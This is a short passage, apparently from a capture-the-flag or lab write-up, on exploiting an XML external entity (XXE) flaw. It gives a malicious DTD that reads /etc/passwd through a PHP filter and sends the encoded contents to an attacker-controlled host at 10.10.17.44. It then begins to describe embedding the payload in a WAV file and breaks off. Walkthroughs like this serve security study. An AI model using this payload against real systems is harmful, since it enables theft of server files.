Exploiting XXE

We need to use an XML DTD file like this one (setting our own IP address):

<!ENTITY % data SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd">  
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://10.10.17.44:8001/?%data;'>">

We will be changing the filename we want to read from the server. Next, we need to craft our payload inside a WAV file (again, with our own IP address):
